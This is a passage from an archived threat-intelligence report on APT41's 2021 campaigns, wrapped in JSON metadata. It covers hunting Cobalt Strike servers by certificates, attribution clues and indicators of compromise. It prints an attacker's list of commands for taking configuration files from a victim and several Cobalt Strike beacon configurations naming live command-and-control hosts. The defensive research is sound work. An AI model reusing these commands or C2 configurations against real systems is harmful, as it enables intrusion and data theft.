batch\\[redacted].bat;\n\ndownload c:\\Users\\{redacted}\\Desktop\\tm remote chat.txt;\n\ndownload c:\\Temp\\netstat.txt;\n\ndownload c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Admin\\web.config;\n\ndownload c:\\Program Files (x86)\\Trend\nMicro\\OfficeScan\\PCCSRV\\Admin\\Utility\\SQL\\web.config;\n\ndownload c:\\Program Files (x86)\\Trend Micro\\OfficeScan\\PCCSRV\\Web\\web.config;\n\ndownload c:\\Program Files (x86)\\Trend\nMicro\\OfficeScan\\PCCSRV\\Web_OSCE\\Web_console\\HTML\\widget_old\\repository\\inc\\class\\comm\n ;\ndownload\nc:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config;\n\ndownload c:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\CONFIG\\web.config;\n\ndownload\nc:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\ASP.NETWebAdminFiles\\web.config;\ndownload c:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\CONFIG\\web.config;\n\ndownload c:\\Windows\\WinSxS\\amd64_clientdeploymentconnectsite_31bf3856ad364e35_10.0.14393.0_none_d2443e4100c72a7c\\web.config;\n\ndownload c:\\Users\\{redacted}\\Desktop\\Office Scan Backup\\Private\\AosBackup.txt\n\n```\nHunting for APT41 Cobalt Strike servers\n\nThis section explains how to hunt for APT41’s network infrastructure. The group usually uses\ncertain servers exclusively to host the Cobalt Strike framework, while they exploit others only\nfor active scanning through Acunetix. The Group-IB TI team identified servers that were used\nfor both, however. It is important that all APT41 servers were protected using the cloud\nservice CloudFlare, which hides the real server addresses. That said, the Group-IB Threat\nIntelligence system detects server backends belonging to various threat actors, including\nAPT41.\n\nAs a result, our clients are among the first to proactively block new servers belonging to\nthreat actors.\n\n\n-----\n\nTo identify APT41 infrastructure, it is essential to describe how Cobalt Strike operates.\n\nThis framework serves as an intermediate server to which threat actors can connect from\nother devices. Other devices connect to the Cobalt Strike server (usually, but not always) on\nport 50050. By default, the server generates a self-signed SSL certificate, which contains the\n“Cobalt Strike” strings.\n\n\n-----\n\nOne of the default Cobalt Strike certificates\n\nHowever, the servers used in these campaigns have different certificates on this port: the two\ncertificates below, with the values “fortawesome”, are unique and clearly indicate that this\nCobalt Strike image belongs to APT41.\n\n\n-----\n\nThe next major feature of Cobalt Strike that the Group-IB team discovered is the use of\ncustom SSL certificates on listeners. Listeners are used to accept connections from the\npayload in order to maintain communication between bots and the C&C server. The group\nuses SSL certificates for HTTPS listeners. In the examples below, APT41 used unique SSL\ncertificates that mimicked “Microsoft”, “Facebook” and “CloudFlare”.\n\nAccording to Group-IB Threat Intelligence data, servers with such certificates first emerged in\nearly 2020. By the end of 2021, their number reached 106. This means that the Group-IB\nteam discovered more than 100 Cobalt Strike servers that are used only by APT41.\nUnsurprisingly, most are no longer active.\n\n**Artifacts and other noteworthy findings**\n\nChinese strings\n\nAn analysis conducted by Group-IB experts revealed the following key artifacts pointing to\nthe origin of APT41:\n\nUsing mainly Chinese IP addresses to communicate with Cobalt Strike servers.\n\n\n-----\n\n```\n171.208.242.0/24 CHINANET\n\n171.208.241.0/24 CHINANET\n\n110.191.217.0/24 CHINANET\n\n102.223.72.0/22 SUNNETWORK-SA\n\n103.165.84.0/24 GEM1-HK\n\n178.79.128.0/18 US-LINODE-20100510\n\n45.152.112.0/23 ALANYHQ\n\n60.248.225.0/24 HINET-NET\n\n61.221.57.0/24 HINET-NET\n\n```\nUsing Chinese characters on the devices from which the attacks were conducted.\n\nUsing a specific Pinyin format for directory names.\n\nPinyin is a romanization system that represents the sounds of the Chinese language through\nthe use of the Latin alphabet. In the case below, a directory is called “yuming”, which in\nChinese means “domain name”.\n\nSeparate directories are used for certain organizations.\n\n“Working” hours” of APT41\n\nResearch into APT41 malware campaigns dated 2021 helped align all the group’s\ntimestamps to UTC+8. As a result, we have come to the following conclusions. The group\nstarts working at 9 AM and its activity stops around 7 PM. It is clear that APT41 members do\nnot work long hours, unlike financially motivated hacker groups like Conti, for example.\nGroups like Conti tirelessly “work” 14 hours a day without any days off, which we described\n[in detail in our report titled “CONTI ARMADA: THE ARMATTACK CAMPAIGN”.](https://www.group-ib.com/resources/threat-research/conti_2022.html)\n\nAccording to this map, the following countries are located in this time zone:\n\nRussia\nAustralia\nMalaysia\nSingapore\nChina\nand others\n\n\n-----\n\n**Conclusion**\n\nFor a long time, security researchers believed that hacked legitimate pentesting and red\nteaming tools, which are widely used by hacker groups, make threat hunting and attribution\nmore difficult. Among such tools, Cobalt Strike stands out. In the past, the tool was\nappreciated by cybercriminal gangs targeting banks, while today it is popular among various\nthreat actors regardless of their motivation, including infamous ransomware operators. That\nis why it is essential to proactively discover servers running this framework and to attribute\nthose servers to specific threat actors. It is a crucial task for all cybersecurity teams that want\nto prevent attacks.\n\nIn this blog post, we shared examples of identifying and correlating Cobalt Strike with\ncampaigns conducted by the state-sponsored group APT41. Thanks to our proprietary\nGroup-IB Threat Intelligence system, which detects and attributes such attacks automatically,\nour clients are the first to be informed about cyberthreats, including all the relevant indicators\nof compromise and TTPs. They are also the first to obtain the names of compromised\norganizations, which helps them avoid supply-chain attacks and make their network\ninfrastructure more secure.\n\nIn line with Group-IB's mission of fighting cybercrime, we will continue to explore the\nmethods, tools, and tactics used by one of the oldest and still dangerous groups, APT41. We\nwill also continue to inform and warn targeted organizations worldwide. We always strive to\nensure that organizations under attack are notified as quickly as possible to help reduce\n\n\n-----\n\npotential damage. We also consider it our responsibility to share our findings with the\ncybersecurity community and encourage researchers to study advanced threats, share data,\nand use our technologies to combat cybercrime — together.\n\nIf you are interested in what we do and would like to become an expert in the same field, you\ncan take our Digital Forensics, Incident Response, and Threat Intelligence training courses.\nWe also welcome applications to join the Group-IB team. Please check our vacancies on the\nwebsite.\n\nTry Group-IB Threat Intelligence now!\n\nOptimize strategic, operational and tactical decision-making with best-in-class cyber threat\nanalytics\n\nTest Drive Group-IB Threat Intelligence\n\nIOCs\n\nCobalt Strike Beacons\n\n\n-----\n\n```\n45.142.214.242:\n\n\"config_payload\": {\n\n      \"process-inject-stub\": \"fbM7aRSiLoJ01wyIz1ATTQ==\",\n\n      \"http-get.uri\": \"javaupdate.biguserup.workers.dev,/jquery-3.3.1.min.js\",\n\n      \"stage.cleanup\": 1,\n\n      \"http-get.server.output\": \"`T\",\n\n      \"post-ex.spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe -k netsvcs\",\n\n      \"post-ex.spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe -k netsvcs\",\n      \"watermark\": 305419896,\n\n      \"process-inject-use-rwx\": 64,\n\n      \"dns_idle\": 134744072,\n\n      \"sleeptime\": 60000,\n\n      \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCY/kAU3i5Cw6hXsXbgonByGxgt0JXT5y/KjC2e0rebpLU+6\n\n      \"maxdns\": 255,\n\n      \"http-post.client\": \"Accept: */*2Referer:\nhttps://javaupdate.biguserup.workers.dev/Accept-Encoding: *&Host:\njavaupdate.biguserup.workers.dev__cfduid\",\n\n      \"ssl\": true,\n\n      \"publickey_md5\": \"531c720aae6e053b9db9be8e7b56f78f\",\n\n      \"http-post.uri\": \"/jquery-3.2.2.min.js\",\n\n      \"jitter\": 41,\n\n      \"cookieBeacon\": 1,\n\n      \"port\": 443,\n\n      \"process-inject-start-rwx\": 64,\n\n      \"http-get.client\": \"Accept-Encoding: *&Host:\njavaupdate.biguserup.workers.devAccept: */*2Referer:\nhttps://javaupdate.biguserup.workers.dev/__cfduid=Cookie\",\n\n      \"http-get.verb\": \"GET\",\n\n      \"proxy_type\": 2,\n\n      \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0)\nGecko/20100101 Firefox/57.0\"\n\n     }\n\n    },\n\n```\n\n-----\n\n```\n45.144.31.31:\n\nconfig_payload\": {\n\n      \"process-inject-stub\": \"d5nX4wNnwCo18Wx3jr4tPg==\",\n\n      \"http-get.uri\": \"cs.colunm.tk,/__utm.gif\",\n\n      \"http-get.server.output\": \"\",\n\n      \"post-ex.spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\n      \"post-ex.spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n\n      \"watermark\": 305419896,\n\n      \"process-inject-use-rwx\": 64,\n\n      \"sleeptime\": 60000,\n\n      \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCBkyCWDMC1Q6VqRZIY35+iU7KtrHy9+HnzzPxCetQ5toPMC\n\n      \"maxdns\": 255,\n\n      \"http-post.client\": \"&Content-Type: application/octet-streamid\",\n\n      \"ssl\": true,\n\n      \"publickey_md5\": \"9cdb3fca6156c6cbed2f01d6431b3dfb\",\n\n      \"http-post.uri\": \"/submit.php\",\n\n      \"cookieBeacon\": 1,\n\n      \"port\": 8443,\n\n      \"process-inject-start-rwx\": 64,\n\n      \"http-get.client\": \"Cookie\",\n\n      \"http-get.verb\": \"GET\",\n\n      \"proxy_type\": 2,\n\n      \"user-agent\": \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;\nTrident/5.0; MANM; MANM)\"\n\n     }\n\n```\n\n-----\n\n```\n45.142.212.47:\n\n\"config_payload\": {\n\n      \"process-inject-stub\": \"9LoFKCrbYlLergvfu7Ki8A==\",\n\n      \"http-get.uri\": \"mute-pond-371d.zalocdn.workers.dev,/jquery3.3.1.min.js\",\n\n      \"stage.cleanup\": 1,\n\n      \"http-get.server.output\": \"`T\",\n\n      \"post-ex.spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe -k netsvcs\",\n\n      \"post-ex.spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe -k netsvcs\",\n      \"process-inject-use-rwx\": 64,\n\n      \"dns_idle\": 134744072,\n\n      \"sleeptime\": 32547,\n\n      \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3WFlrP6k0u+i8ozfzb2lLZHkTokxc3l8Hzysu+yF7wHEG7\n\n      \"maxdns\": 255,\n\n      \"http-post.client\": \"Accept: */*4Referer: https://mute-pond371d.zalocdn.workers.dev/Accept-Encoding: *(Host: mute-pond371d.zalocdn.workers.dev__cfduid\",\n\n      \"ssl\": true,\n\n      \"publickey_md5\": \"a9020b0e5342fb8877d2fb213802132f\",\n\n      \"http-post.uri\": \"/jquery-3.2.2.min.js\",\n\n      \"jitter\": 41,\n\n      \"cookieBeacon\": 1,\n\n      \"port\": 443,\n\n      \"process-inject-start-rwx\": 64,\n\n      \"http-get.client\": \"Accept-Encoding: *(Host: mute-pond371d.zalocdn.workers.devAccept: */*4Referer: https://mute-pond371d.zalocdn.workers.dev/__cfduid=Cookie\",\n\n      \"http-get.verb\": \"GET\",\n\n      \"proxy_type\": 2,\n\n      \"user-agent\": \"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv)\nAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0\"\n\n     }\n\n    },\n\n```\n\n-----\n\n```\n185.250.150.22:\n\n\"config_payload\": {\n\n      \"http-get.uri\": \"mute-pond-371d.zalocdn.workers.dev,/jquery3.3.1.min.js\",\n\n      \"stage.cleanup\": 1,\n\n      \"http-get.server.output\": \"`T\",\n\n      \"post-ex.spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe -k netsvcs\",\n\n      \"post-ex.spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe -k netsvcs\",\n      \"process-inject-use-rwx\": 64,\n\n      \"dns_idle\": 134744072,\n\n      \"sleeptime\": 32547,\n\n      \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCQ2/teGq2eUgU2sZjiJCCcKH7RgQrsICSgVdA9hT26lhijh\n\n      \"maxdns\": 255,\n\n      \"http-post.client\": \"Accept: */*4Referer: https://mute-pond371d.zalocdn.workers.dev/Accept-Encoding: *(Host: mute-pond371d.zalocdn.workers.dev__cfduid\",\n\n      \"ssl\": true,\n\n      \"publickey_md5\": \"398c270c67cd915134ebbf7108090789\",\n\n      \"http-post.uri\": \"/jquery-3.2.2.min.js\",\n\n      \"jitter\": 41,\n\n      \"cookieBeacon\": 1,\n\n      \"port\": 443,\n\n      \"process-inject-start-rwx\": 64,\n\n      \"http-get.client\": \"Accept-Encoding: *(Host: mute-pond371d.zalocdn.workers.devAccept: */*4Referer: https://mute-pond371d.zalocdn.workers.dev/__cfduid=Cookie\",\n\n      \"http-get.verb\": \"GET\",\n\n      \"proxy_type\": 2,\n\n      \"user-agent\": \"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv)\nAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0\"\n\n     }\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-18 - APT41 World Tour 2021 on a tight schedule.pdf"
    ],
    "report_names": [
        "2022-08-18 - APT41 World Tour 2021 on a tight schedule.pdf"
    ],
    "threat_actors": [
        {
            "id": "aada2650-7bef-45e4-8371-18c4318a7056",
            "created_at": "2022-10-25T15:50:23.422502Z",
            "updated_at": "2025-03-27T02:00:55.465428Z",
            "deleted_at": null,
            "main_name": "Suckfly",
            "aliases": [
                "Suckfly"
            ],
            "source_name": "MITRE:Suckfly",
            "tools": [
                "Nidiran"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a4a3c2a4-992d-4ce6-8c97-e39b23da9a26",
            "created_at": "2022-10-25T16:07:24.242051Z",
            "updated_at": "2025-03-27T02:02:10.148675Z",
            "deleted_at": null,
            "main_name": "Suckfly",
            "aliases": [],
            "source_name": "ETDA:Suckfly",
            "tools": [
                "Backdoor.Nidiran",
                "Nidiran",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "gsecdump",
                "smbscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "084e4456-1409-4664-9bc4-ceb6f6aacc20",
            "created_at": "2022-10-25T16:47:55.565006Z",
            "updated_at": "2025-03-27T02:05:17.263141Z",
            "deleted_at": null,
            "main_name": "BRONZE EXPORT",
            "aliases": [
                "Wicked Spider ",
                "TG-3279 "
            ],
            "source_name": "Secureworks:BRONZE EXPORT",
            "tools": [
                " PwDump",
                " pwdump6",
                "Conpee"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "49822165-5541-423d-8808-1c0a9448d588",
            "created_at": "2022-10-25T16:07:23.384093Z",
            "updated_at": "2025-03-27T02:02:09.772829Z",
            "deleted_at": null,
            "main_name": "Barium",
            "aliases": [
                "Brass Typhoon",
                "Pigfish"
            ],
            "source_name": "ETDA:Barium",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Barlaiy",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Destroy RAT",
                "DestroyRAT",
                "Kaba",
                "Korplug",
                "POISONPLUG",
                "PlugX",
                "RbDoor",
                "RedDelta",
                "RibDoor",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Winnti",
                "Xamtrav",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
            "created_at": "2022-10-25T16:07:24.413971Z",
            "updated_at": "2025-03-27T02:02:10.212853Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Wicked Panda",
                "Winnti Group"
            ],
            "source_name": "ETDA:Winnti Group",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "FunnySwitch",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7b039cc0-33b6-495a-b4ca-649d096b993d",
            "created_at": "2023-01-06T13:46:38.482654Z",
            "updated_at": "2025-03-27T02:00:02.845093Z",
            "deleted_at": null,
            "main_name": "APT22",
            "aliases": [
                "BRONZE OLIVE",
                "Group 46",
                "G0039",
                "Suckfly"
            ],
            "source_name": "MISPGALAXY:APT22",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1d0f389f-2f6c-415d-91f4-633bd6c645f7",
            "created_at": "2024-05-01T02:03:07.974188Z",
            "updated_at": "2025-03-27T02:05:17.280317Z",
            "deleted_at": null,
            "main_name": "BRONZE OLIVE",
            "aliases": [
                "Barista",
                "Group 46 ",
                "Suckfly ",
                "APT22 "
            ],
            "source_name": "Secureworks:BRONZE OLIVE",
            "tools": [
                " DestroyRAT",
                " PlugX",
                " TCP/ICMP RAT",
                "Angryrebel"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c7d9878a-e691-4c6f-81ae-84fb115a1345",
            "created_at": "2022-10-25T16:07:23.359506Z",
            "updated_at": "2025-03-27T02:02:09.752427Z",
            "deleted_at": null,
            "main_name": "APT 41",
            "aliases": [
                "BrazenBamboo",
                "Bronze Atlas",
                "Double Dragon",
                "Earth Baku",
                "Grayfly",
                "Operation ColunmTK",
                "Operation CuckooBees",
                "Operation ShadowHammer",
                "Red Kelpie",
                "SparklingGoblin",
                "TA415",
                "TG-2633"
            ],
            "source_name": "ETDA:APT 41",
            "tools": [
                "9002 RAT",
                "ADORE.XSEC",
                "ASPXSpy",
                "ASPXTool",
                "AceHash",
                "Agent.dhwf",
                "Agentemis",
                "AndroidControl",
                "AngryRebel",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BLUEBEAM",
                "Barlaiy",
                "BlackCoffee",
                "Bladabindi",
                "BleDoor",
                "CCleaner Backdoor",
                "CHINACHOPPER",
                "COLDJAVA",
                "China Chopper",
                "ChyNode",
                "Cobalt Strike",
                "CobaltStrike",
                "Crackshot",
                "CrossWalk",
                "CurveLast",
                "CurveLoad",
                "DAYJOB",
                "DBoxAgent",
                "DEADEYE",
                "DEADEYE.APPEND",
                "DEADEYE.EMBED",
                "DEPLOYLOG",
                "DIRTCLEANER",
                "DUSTTRAP",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "DodgeBox",
                "DragonEgg",
                "ELFSHELF",
                "EasyNight",
                "Farfli",
                "FunnySwitch",
                "Gh0st RAT",
                "Ghost RAT",
                "HDD Rootkit",
                "HDRoot",
                "HKDOOR",
                "HOMEUNIX",
                "HUI Loader",
                "HidraQ",
                "HighNoon",
                "HighNote",
                "Homux",
                "Hydraq",
                "Jorik",
                "Jumpall",
                "KEYPLUG",
                "Kaba",
                "Korplug",
                "LATELUNCH",
                "LOLBAS",
                "LOLBins",
                "LightSpy",
                "Living off the Land",
                "Lowkey",
                "McRAT",
                "MdmBot",
                "MessageTap",
                "Meterpreter",
                "Mimikatz",
                "MoonBounce",
                "MoonWalk",
                "Motnug",
                "Moudour",
                "Mydoor",
                "NTDSDump",
                "PACMAN",
                "PCRat",
                "PINEGROVE",
                "PNGRAT",
                "POISONPLUG",
                "POISONPLUG.SHADOW",
                "POTROAST",
                "PRIVATELOG",
                "PipeMon",
                "PlugX",
                "PortReuse",
                "ProxIP",
                "ROCKBOOT",
                "RbDoor",
                "RedDelta",
                "RedXOR",
                "RibDoor",
                "Roarur",
                "RouterGod",
                "SAGEHIRE",
                "SPARKLOG",
                "SQLULDR2",
                "STASHLOG",
                "SWEETCANDLE",
                "ScrambleCross",
                "Sensocode",
                "SerialVlogger",
                "ShadowHammer",
                "ShadowPad Winnti",
                "SinoChopper",
                "Skip-2.0",
                "SneakCross",
                "Sogu",
                "Speculoos",
                "Spyder",
                "StealthReacher",
                "StealthVector",
                "TERA",
                "TIDYELF",
                "TIGERPLUG",
                "TOMMYGUN",
                "TVT",
                "Thoper",
                "Voldemort",
                "WIDETONE",
                "WINNKIT",
                "WINTERLOVE",
                "Winnti",
                "WyrmSpy",
                "X-Door",
                "XDOOR",
                "XMRig",
                "XShellGhost",
                "Xamtrav",
                "ZXShell",
                "ZoxPNG",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "gresim",
                "njRAT",
                "pwdump",
                "xDll"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "273a41a8-5115-4f55-865f-0960a765f18c",
            "created_at": "2022-10-25T16:07:24.397947Z",
            "updated_at": "2025-03-27T02:02:10.208221Z",
            "deleted_at": null,
            "main_name": "Wicked Spider",
            "aliases": [
                "APT 22",
                "Bronze Export",
                "Bronze Olive",
                "Wicked Spider"
            ],
            "source_name": "ETDA:Wicked Spider",
            "tools": [
                "Agent.dhwf",
                "AngryRebel",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EternalBlue",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "Kaba",
                "Korplug",
                "Moudour",
                "Mydoor",
                "PCRat",
                "PlugX",
                "RedDelta",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Xamtrav"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535667,
    "ts_updated_at": 1743041818,
    "ts_creation_date": 1662027053,
    "ts_modification_date": 1662027053,
    "files": {
        "pdf": "https://archive.orkl.eu/c120f3042fa67a289df74719a2a767db341fee14.pdf",
        "text": "https://archive.orkl.eu/c120f3042fa67a289df74719a2a767db341fee14.txt",
        "img": "https://archive.orkl.eu/c120f3042fa67a289df74719a2a767db341fee14.jpg"
    }
}